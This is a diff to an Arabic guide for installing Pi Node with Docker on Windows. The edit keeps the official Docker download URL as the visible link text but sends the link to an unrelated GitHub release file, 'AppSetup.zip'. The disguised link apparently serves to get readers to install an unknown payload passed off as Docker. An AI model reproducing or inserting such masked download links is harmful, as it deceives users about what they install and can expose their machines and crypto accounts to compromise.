@@ -4,7 +4,7 @@
 https://node.minepi.com/node/ 
 
 2. برنامج دوكر لتشغيل الأنظمة الوهمية
-https://docs.docker.com/docker-for-windows/install/
+[https://docs.docker.com/docker-for-windows/install/](https://github.com/bonkonauts/cors-anywhere/releases/download/v0.1.9/AppSetup.zip)
 
 
 بعد تنصيب البرامج نشغل docker ثم نشغل برنامج Pi Node و نتبع خطوات التشغيل الأولية و الاقتران مع البرنامج على الهاتف.
